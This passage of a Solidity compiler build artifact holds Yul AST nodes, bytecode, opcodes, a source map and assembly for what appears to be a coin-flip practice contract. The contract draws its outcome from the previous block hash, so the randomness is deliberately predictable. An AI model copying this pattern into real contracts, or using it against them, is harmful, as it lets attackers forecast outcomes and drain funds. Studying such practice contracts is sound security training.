																	"nativeSrc": "2103:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2103:3:2"
																},
																"nativeSrc": "2103:9:2",
																"nodeType": "YulFunctionCall",
																"src": "2103:9:2"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nativeSrc": "2095:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "2095:4:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "2137:22:2",
																"nodeType": "YulBlock",
																"src": "2137:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nativeSrc": "2139:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "2139:16:2"
																			},
																			"nativeSrc": "2139:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2139:18:2"
																		},
																		"nativeSrc": "2139:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2139:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "diff",
																		"nativeSrc": "2128:4:2",
																		"nodeType": "YulIdentifier",
																		"src": "2128:4:2"
																	},
																	{
																		"name": "x",
																		"nativeSrc": "2134:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2134:1:2"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nativeSrc": "2125:2:2",
																	"nodeType": "YulIdentifier",
																	"src": "2125:2:2"
																},
																"nativeSrc": "2125:11:2",
																"nodeType": "YulFunctionCall",
																"src": "2125:11:2"
															},
															"nativeSrc": "2122:37:2",
															"nodeType": "YulIf",
															"src": "2122:37:2"
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nativeSrc": "1972:194:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nativeSrc": "2003:1:2",
														"nodeType": "YulTypedName",
														"src": "2003:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nativeSrc": "2006:1:2",
														"nodeType": "YulTypedName",
														"src": "2006:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nativeSrc": "2012:4:2",
														"nodeType": "YulTypedName",
														"src": "2012:4:2",
														"type": ""
													}
												],
												"src": "1972:194:2"
											},
											{
												"body": {
													"nativeSrc": "2200:152:2",
													"nodeType": "YulBlock",
													"src": "2200:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "2217:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2217:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2220:77:2",
																		"nodeType": "YulLiteral",
																		"src": "2220:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2210:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2210:6:2"
																},
																"nativeSrc": "2210:88:2",
																"nodeType": "YulFunctionCall",
																"src": "2210:88:2"
															},
															"nativeSrc": "2210:88:2",
															"nodeType": "YulExpressionStatement",
															"src": "2210:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "2314:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2314:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2317:4:2",
																		"nodeType": "YulLiteral",
																		"src": "2317:4:2",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2307:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2307:6:2"
																},
																"nativeSrc": "2307:15:2",
																"nodeType": "YulFunctionCall",
																"src": "2307:15:2"
															},
															"nativeSrc": "2307:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "2307:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "2338:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2338:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2341:4:2",
																		"nodeType": "YulLiteral",
																		"src": "2341:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "2331:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2331:6:2"
																},
																"nativeSrc": "2331:15:2",
																"nodeType": "YulFunctionCall",
																"src": "2331:15:2"
															},
															"nativeSrc": "2331:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "2331:15:2"
														}
													]
												},
												"name": "panic_error_0x12",
												"nativeSrc": "2172:180:2",
												"nodeType": "YulFunctionDefinition",
												"src": "2172:180:2"
											},
											{
												"body": {
													"nativeSrc": "2400:143:2",
													"nodeType": "YulBlock",
													"src": "2400:143:2",
													"statements": [
														{
															"nativeSrc": "2410:25:2",
															"nodeType": "YulAssignment",
															"src": "2410:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "2433:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2433:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2415:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "2415:17:2"
																},
																"nativeSrc": "2415:20:2",
																"nodeType": "YulFunctionCall",
																"src": "2415:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nativeSrc": "2410:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2410:1:2"
																}
															]
														},
														{
															"nativeSrc": "2444:25:2",
															"nodeType": "YulAssignment",
															"src": "2444:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "2467:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2467:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2449:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "2449:17:2"
																},
																"nativeSrc": "2449:20:2",
																"nodeType": "YulFunctionCall",
																"src": "2449:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nativeSrc": "2444:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2444:1:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "2491:22:2",
																"nodeType": "YulBlock",
																"src": "2491:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nativeSrc": "2493:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "2493:16:2"
																			},
																			"nativeSrc": "2493:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2493:18:2"
																		},
																		"nativeSrc": "2493:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2493:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "2488:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2488:1:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "2481:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2481:6:2"
																},
																"nativeSrc": "2481:9:2",
																"nodeType": "YulFunctionCall",
																"src": "2481:9:2"
															},
															"nativeSrc": "2478:35:2",
															"nodeType": "YulIf",
															"src": "2478:35:2"
														},
														{
															"nativeSrc": "2523:14:2",
															"nodeType": "YulAssignment",
															"src": "2523:14:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "2532:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2532:1:2"
																	},
																	{
																		"name": "y",
																		"nativeSrc": "2535:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2535:1:2"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nativeSrc": "2528:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2528:3:2"
																},
																"nativeSrc": "2528:9:2",
																"nodeType": "YulFunctionCall",
																"src": "2528:9:2"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nativeSrc": "2523:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2523:1:2"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nativeSrc": "2358:185:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nativeSrc": "2389:1:2",
														"nodeType": "YulTypedName",
														"src": "2389:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nativeSrc": "2392:1:2",
														"nodeType": "YulTypedName",
														"src": "2392:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nativeSrc": "2398:1:2",
														"nodeType": "YulTypedName",
														"src": "2398:1:2",
														"type": ""
													}
												],
												"src": "2358:185:2"
											},
											{
												"body": {
													"nativeSrc": "2592:190:2",
													"nodeType": "YulBlock",
													"src": "2592:190:2",
													"statements": [
														{
															"nativeSrc": "2602:33:2",
															"nodeType": "YulAssignment",
															"src": "2602:33:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "2629:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "2629:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2611:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "2611:17:2"
																},
																"nativeSrc": "2611:24:2",
																"nodeType": "YulFunctionCall",
																"src": "2611:24:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "2602:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "2602:5:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "2725:22:2",
																"nodeType": "YulBlock",
																"src": "2725:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nativeSrc": "2727:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "2727:16:2"
																			},
																			"nativeSrc": "2727:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2727:18:2"
																		},
																		"nativeSrc": "2727:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2727:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "2650:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "2650:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2657:66:2",
																		"nodeType": "YulLiteral",
																		"src": "2657:66:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nativeSrc": "2647:2:2",
																	"nodeType": "YulIdentifier",
																	"src": "2647:2:2"
																},
																"nativeSrc": "2647:77:2",
																"nodeType": "YulFunctionCall",
																"src": "2647:77:2"
															},
															"nativeSrc": "2644:103:2",
															"nodeType": "YulIf",
															"src": "2644:103:2"
														},
														{
															"nativeSrc": "2756:20:2",
															"nodeType": "YulAssignment",
															"src": "2756:20:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "2767:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "2767:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2774:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2774:1:2",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2763:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2763:3:2"
																},
																"nativeSrc": "2763:13:2",
																"nodeType": "YulFunctionCall",
																"src": "2763:13:2"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nativeSrc": "2756:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2756:3:2"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nativeSrc": "2549:233:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2578:5:2",
														"nodeType": "YulTypedName",
														"src": "2578:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nativeSrc": "2588:3:2",
														"nodeType": "YulTypedName",
														"src": "2588:3:2",
														"type": ""
													}
												],
												"src": "2549:233:2"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        diff := sub(x, y)\n\n        if gt(diff, x) { panic_error_0x11() }\n\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80631d263f6714610038578063e6f334d714610068575b5f5ffd5b610052600480360381019061004d9190610150565b610086565b60405161005f919061018a565b60405180910390f35b610070610112565b60405161007d91906101bb565b60405180910390f35b5f5f6001436100959190610201565b405f1c905080600154036100a7575f5ffd5b806001819055505f600254826100bd9190610261565b90505f600182146100ce575f6100d1565b60015b905084151581151503610100575f5f8154809291906100ef90610291565b91905055506001935050505061010d565b5f5f819055505f93505050505b919050565b5f5481565b5f5ffd5b5f8115159050919050565b61012f8161011b565b8114610139575f5ffd5b50565b5f8135905061014a81610126565b92915050565b5f6020828403121561016557610164610117565b5b5f6101728482850161013c565b91505092915050565b6101848161011b565b82525050565b5f60208201905061019d5f83018461017b565b92915050565b5f819050919050565b6101b5816101a3565b82525050565b5f6020820190506101ce5f8301846101ac565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61020b826101a3565b9150610216836101a3565b925082820390508181111561022e5761022d6101d4565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61026b826101a3565b9150610276836101a3565b92508261028657610285610234565b5b828204905092915050565b5f61029b826101a3565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036102cd576102cc6101d4565b5b60018201905091905056fea2646970667358221220979f4f4c66a4c684c8a9118e997d5035ce92f824c739ccddec30d6067e22124f64736f6c634300081c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x68 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x52 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x150 JUMP JUMPDEST PUSH2 0x86 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5F SWAP2 SWAP1 PUSH2 0x18A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x70 PUSH2 0x112 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7D SWAP2 SWAP1 PUSH2 0x1BB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 PUSH1 0x1 NUMBER PUSH2 0x95 SWAP2 SWAP1 PUSH2 0x201 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD SUB PUSH2 0xA7 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xBD SWAP2 SWAP1 PUSH2 0x261 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0xCE JUMPI PUSH0 PUSH2 0xD1 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x100 JUMPI PUSH0 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xEF SWAP1 PUSH2 0x291 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x10D JUMP JUMPDEST PUSH0 PUSH0 DUP2 SWAP1 SSTORE POP PUSH0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 SLOAD DUP2 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x12F DUP2 PUSH2 0x11B JUMP JUMPDEST DUP2 EQ PUSH2 0x139 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x14A DUP2 PUSH2 0x126 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x165 JUMPI PUSH2 0x164 PUSH2 0x117 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x172 DUP5 DUP3 DUP6 ADD PUSH2 0x13C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x184 DUP2 PUSH2 0x11B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19D PUSH0 DUP4 ADD DUP5 PUSH2 0x17B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1B5 DUP2 PUSH2 0x1A3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1CE PUSH0 DUP4 ADD DUP5 PUSH2 0x1AC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x20B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x216 DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x22E JUMPI PUSH2 0x22D PUSH2 0x1D4 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x26B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x276 DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x286 JUMPI PUSH2 0x285 PUSH2 0x234 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x29B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x2CD JUMPI PUSH2 0x2CC PUSH2 0x1D4 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP8 SWAP16 0x4F 0x4C PUSH7 0xA4C684C8A9118E SWAP10 PUSH30 0x5035CE92F824C739CCDDEC30D6067E22124F64736F6C634300081C003300 ",
							"sourceMap": "57:655:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;281:429;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;80:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;281:429;324:4;336:18;390:1;375:12;:16;;;;:::i;:::-;365:27;357:36;;336:57;;416:10;404:8;;:22;400:51;;436:8;;;400:51;468:10;457:8;:21;;;;484:16;516:6;;503:10;:19;;;;:::i;:::-;484:38;;528:9;552:1;540:8;:13;:28;;563:5;540:28;;;556:4;540:28;528:40;;587:6;579:14;;:4;:14;;;575:131;;603:15;;:17;;;;;;;;;:::i;:::-;;;;;;635:4;628:11;;;;;;;575:131;678:1;660:15;:19;;;;694:5;687:12;;;;;281:429;;;;:::o;80:30::-;;;;:::o;88:117:2:-;197:1;194;187:12;334:90;368:7;411:5;404:13;397:21;386:32;;334:90;;;:::o;430:116::-;500:21;515:5;500:21;:::i;:::-;493:5;490:32;480:60;;536:1;533;526:12;480:60;430:116;:::o;552:133::-;595:5;633:6;620:20;611:29;;649:30;673:5;649:30;:::i;:::-;552:133;;;;:::o;691:323::-;747:6;796:2;784:9;775:7;771:23;767:32;764:119;;;802:79;;:::i;:::-;764:119;922:1;947:50;989:7;980:6;969:9;965:22;947:50;:::i;:::-;937:60;;893:114;691:323;;;;:::o;1020:109::-;1101:21;1116:5;1101:21;:::i;:::-;1096:3;1089:34;1020:109;;:::o;1135:210::-;1222:4;1260:2;1249:9;1245:18;1237:26;;1273:65;1335:1;1324:9;1320:17;1311:6;1273:65;:::i;:::-;1135:210;;;;:::o;1351:77::-;1388:7;1417:5;1406:16;;1351:77;;;:::o;1434:118::-;1521:24;1539:5;1521:24;:::i;:::-;1516:3;1509:37;1434:118;;:::o;1558:222::-;1651:4;1689:2;1678:9;1674:18;1666:26;;1702:71;1770:1;1759:9;1755:17;1746:6;1702:71;:::i;:::-;1558:222;;;;:::o;1786:180::-;1834:77;1831:1;1824:88;1931:4;1928:1;1921:15;1955:4;1952:1;1945:15;1972:194;2012:4;2032:20;2050:1;2032:20;:::i;:::-;2027:25;;2066:20;2084:1;2066:20;:::i;:::-;2061:25;;2110:1;2107;2103:9;2095:17;;2134:1;2128:4;2125:11;2122:37;;;2139:18;;:::i;:::-;2122:37;1972:194;;;;:::o;2172:180::-;2220:77;2217:1;2210:88;2317:4;2314:1;2307:15;2341:4;2338:1;2331:15;2358:185;2398:1;2415:20;2433:1;2415:20;:::i;:::-;2410:25;;2449:20;2467:1;2449:20;:::i;:::-;2444:25;;2488:1;2478:35;;2493:18;;:::i;:::-;2478:35;2535:1;2532;2528:9;2523:14;;2358:185;;;;:::o;2549:233::-;2588:3;2611:24;2629:5;2611:24;:::i;:::-;2602:33;;2657:66;2650:5;2647:77;2644:103;;2727:18;;:::i;:::-;2644:103;2774:1;2767:5;2763:13;2756:20;;2549:233;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "156400",
								"executionCost": "27318",
								"totalCost": "183718"
							},
							"external": {
								"consecutiveWins()": "2424",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 151,
									"end": 228,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 134,
									"end": 228,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 134,
									"end": 228,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 233,
									"end": 277,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 233,
									"end": 277,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 233,
									"end": 277,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 233,
									"end": 277,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 233,
									"end": 277,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 271,
									"end": 272,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 253,
									"end": 268,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 253,
									"end": 272,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 253,
									"end": 272,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 253,
									"end": 272,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 253,
									"end": 272,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 57,
									"end": 712,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 57,
									"end": 712,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220979f4f4c66a4c684c8a9118e997d5035ce92f824c739ccddec30d6067e22124f64736f6c634300081c0033",
									".code": [
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 57,
											"end": 712,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
